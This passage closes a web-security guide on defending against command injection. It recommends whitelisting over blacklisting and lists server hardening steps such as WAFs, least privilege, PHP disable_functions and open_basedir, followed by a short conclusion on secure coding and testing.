```

- **Avoid blacklists**: Blacklisting characters or words is insufficient and prone to bypasses. Use whitelists or built-in sanitization functions instead.

---

## Server Configuration

Properly configure your server to minimize the impact of potential vulnerabilities:

1. **Web Application Firewall (WAF)**: Use both built-in (e.g., Apache `mod_security`) and external WAFs (e.g., Cloudflare, Fortinet).
2. **Principle of Least Privilege (PoLP)**: Run the webserver as a low-privileged user (e.g., `www-data`).
3. **Restrict dangerous functions**: Disable system functions like `system` in PHP:

```php
; disable_functions=system,...
```

4. **Limit accessible scope**: Restrict the application’s access to its folder:

```php
; open_basedir = '/var/www/html'
```

5. **Reject malicious requests**:
   - Reject double-encoded requests.
   - Reject non-ASCII characters in URLs.

6. **Avoid outdated libraries**: Replace outdated or sensitive modules (e.g., PHP CGI).

---

## Conclusion

- **Secure coding**: Combine secure coding practices with thorough penetration testing.
- **Thorough testing**: Even with millions of lines of code, a single mistake can introduce vulnerabilities. Regularly audit and test web applications to ensure security.
